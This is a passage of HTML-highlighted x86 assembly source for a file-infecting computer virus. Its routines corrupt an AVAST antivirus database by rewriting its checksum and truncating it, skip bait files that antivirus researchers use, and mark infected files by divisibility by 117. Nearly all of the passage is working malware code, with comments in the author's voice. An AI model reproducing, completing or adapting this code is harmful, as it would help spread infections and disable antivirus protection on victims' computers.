        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">50000</span><span class="sc0">       </span><span class="sc1">;hmmm, + &lt;0,50Kb)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">AVAST_memSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_new_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read signature</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;four bytes, please</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__ka_dealloc</span><span class="sc0">

        </span><span class="sc1">; check signature</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">00000002h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000F4h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__ka_dealloc</span><span class="sc0">

        </span><span class="sc1">; read new size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_new_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__ka_dealloc</span><span class="sc0">

        </span><span class="sc1">; calculate new checksum :)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">;clear these regz</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_memory</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;place in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_new_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;really readed bytes</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;sub chacksum word</span><span class="sc0">

    </span><span class="sc5">__ka_decode_body</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__ka_decode_body</span><span class="sc0">

        </span><span class="sc1">; and now, I must do the final test</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;AX=new checksum !!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_checksum</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; write new checksum</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_checksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyWriteFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__ka_dealloc</span><span class="sc0">

        </span><span class="sc1">; truncate database :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_new_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetFilePointer</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetEndOfFile</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__ka_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">
    </span><span class="sc5">__ka_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ may I infect that file ? ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function checks whether file is enabled to infect.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:   EBX ... filename</span><span class="sc0">
        </span><span class="sc1">;       ESI ... pointer to an avoid table</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">validate_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__va_check_file</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; get last '\' char</span><span class="sc0">
    </span><span class="sc5">__va_get_filename</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrlen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">__va_next_char</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__va_found</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__va_next_char</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">__va_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__va_check_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrlen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__va_file_invalid</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;go to the next file</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; + zero char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;end of table ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__va_check_file</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
    </span><span class="sc5">__va_file_invalid</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ anti-bait: do not infect AV files ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Baits are do-nothing programs used by AVers to spread.</span><span class="sc0">
        </span><span class="sc1">;Familiarly AVers using these filenames:</span><span class="sc0">
        </span><span class="sc1">;     00000001.EXE, 00000002.EXE, 00000003.EXE etc.</span><span class="sc0">
        </span><span class="sc1">;or</span><span class="sc0">
        </span><span class="sc1">;     AAAAAAAA.EXE, AAAAAAAB.EXE, AAAAAAAC.EXE etc.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;This function checks if filename certains any triple chars</span><span class="sc0">
        </span><span class="sc1">;in sequence. It is typical anti-bait.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:   filename_ptr    ... is filled</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">fuck_av_files</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; get filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__va_get_filename</span><span class="sc0">   </span><span class="sc1">;EAX = filename length</span><span class="sc0">

        </span><span class="sc1">; check triple chars (= anti-bait)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;AH=last char, AL=act. char</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;BL=how many chars</span><span class="sc0">
    </span><span class="sc5">__faf_repeat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;last char == actual char ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__faf_same_char</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__faf_next_char</span><span class="sc0">
    </span><span class="sc5">__faf_same_char</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">;triple char ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__faf_failed</span><span class="sc0">
    </span><span class="sc5">__faf_next_char</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__faf_repeat</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
    </span><span class="sc5">__faf_failed</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to check if file has been infected ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function check whether number in EAX is divided by</span><span class="sc0">
        </span><span class="sc1">;special number 117 which the autor has selected for this</span><span class="sc0">
        </span><span class="sc1">;virus. And 'cause every dividing is possible count through</span><span class="sc0">
        </span><span class="sc1">;natural logarithm, so I use this math method :).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;    in classic math:</span><span class="sc0">
        </span><span class="sc1">;       " if ((EAX mod 117)==0) file_is_not_infected "</span><span class="sc0">
        </span><span class="sc1">;    in ln  math:</span><span class="sc0">
        </span><span class="sc1">;       " if ((modf(exp(ln(EAX)-ln(117)),&amp;integer)==0)</span><span class="sc0">
        </span><span class="sc1">;         file_not_infected "</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Well, "a/b == e^(ln(a) - ln(b))"</span><span class="sc0">
        </span><span class="sc1">;      "a*b == e^(ln(a) + ln(b))" etc.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;      "exp(x) == 2^(x * log2ofE)" etc.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Easy to understand :)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__check_infected</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">source_value</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">divided_value</span><span class="sc4">],</span><span class="sc2">117</span><span class="sc0">

        </span><span class="sc7">fsave</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_nl_buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save all regz &amp; flagz</span><span class="sc0">
        </span><span class="sc7">fninit</span><span class="sc0">              </span><span class="sc1">;inicialize co-processor</span><span class="sc0">
        </span><span class="sc7">fldln2</span><span class="sc0">              </span><span class="sc1">;give me "e^fldln2==2"</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">source_value</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;input number</span><span class="sc0">
        </span><span class="sc7">fyl2x</span><span class="sc0">               </span><span class="sc1">;calculate natural logarithm</span><span class="sc0">
        </span><span class="sc7">fldln2</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">divided_value</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fyl2x</span><span class="sc0">               </span><span class="sc1">;calculate 2nd nat logarithm</span><span class="sc0">
        </span><span class="sc7">fsubp</span><span class="sc0">               </span><span class="sc1">;ln(EAX) - ln(117)</span><span class="sc0">

        </span><span class="sc7">fldl2e</span><span class="sc0">              </span><span class="sc1">;give me log2ofE == 2^</span><span class="sc0">
        </span><span class="sc7">fmulp</span><span class="sc0">
        </span><span class="sc7">fabs</span><span class="sc0">                </span><span class="sc1">;absolute number</span><span class="sc0">
        </span><span class="sc7">fld1</span><span class="sc0">
        </span><span class="sc7">fld</span><span class="sc0">

        </span><span class="sc7">fstcw</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_truncate</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;change rounding</span><span class="sc0">
        </span><span class="sc7">fstcw</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_default</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fscale</span><span class="sc0">              </span><span class="sc1">;2^(trunc ST(1)) + ST(0)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_truncate</span><span class="sc4">],</span><span class="sc2">0Fh</span><span class="sc0">  </span><span class="sc1">;specify truncation mode</span><span class="sc0">
        </span><span class="sc7">fldcw</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_truncate</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;new mode</span><span class="sc0">
        </span><span class="sc7">frndint</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_default</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0f3h</span><span class="sc1">;default back to round-nearest</span><span class="sc0">
        </span><span class="sc7">fldcw</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_default</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;default mode</span><span class="sc0">

        </span><span class="sc7">fist</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_further</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save calculing value</span><span class="sc0">
        </span><span class="sc7">fxch</span><span class="sc0">
        </span><span class="sc7">fchs</span><span class="sc0">                </span><span class="sc1">;negative</span><span class="sc0">
        </span><span class="sc7">fxch</span><span class="sc0">
        </span><span class="sc7">fscale</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">                </span><span class="sc1">;fscale did not adjust stack</span><span class="sc0">
        </span><span class="sc7">fsubp</span><span class="sc0">               </span><span class="sc1">;now is "0 &lt;= st(0) &lt; 0.5"</span><span class="sc0">

        </span><span class="sc7">f2xm1</span><span class="sc0">               </span><span class="sc1">;calculate 2^st(0)</span><span class="sc0">
        </span><span class="sc7">fld1</span><span class="sc0">
        </span><span class="sc7">faddp</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_further</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">__no_sqrt2</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sqrt2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;use sqrt(2) to calculate</span><span class="sc0">
        </span><span class="sc7">fmulp</span><span class="sc0">               </span><span class="sc1">;the 2nd part</span><span class="sc0">

    </span><span class="sc5">__no_sqrt2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_further</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fxch</span><span class="sc0">
        </span><span class="sc7">fscale</span><span class="sc0">              </span><span class="sc1">;fscale doesn't adjust stack</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">

        </span><span class="sc7">fldcw</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_truncate</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;set truncate mode</span><span class="sc0">
        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;st(0)=st(1)</span><span class="sc0">
        </span><span class="sc7">frndint</span><span class="sc0">             </span><span class="sc1">;truncate number</span><span class="sc0">
        </span><span class="sc7">fsubp</span><span class="sc0">               </span><span class="sc1">;give me only decimal places</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rounded_value</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;rounding</span><span class="sc0">
        </span><span class="sc7">fmulp</span><span class="sc0">               </span><span class="sc1">;multiply by 10^x</span><span class="sc0">
        </span><span class="sc7">frndint</span><span class="sc0">
        </span><span class="sc7">fistp</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decimal_places</span><span class="sc4">]</span><span class="sc0">
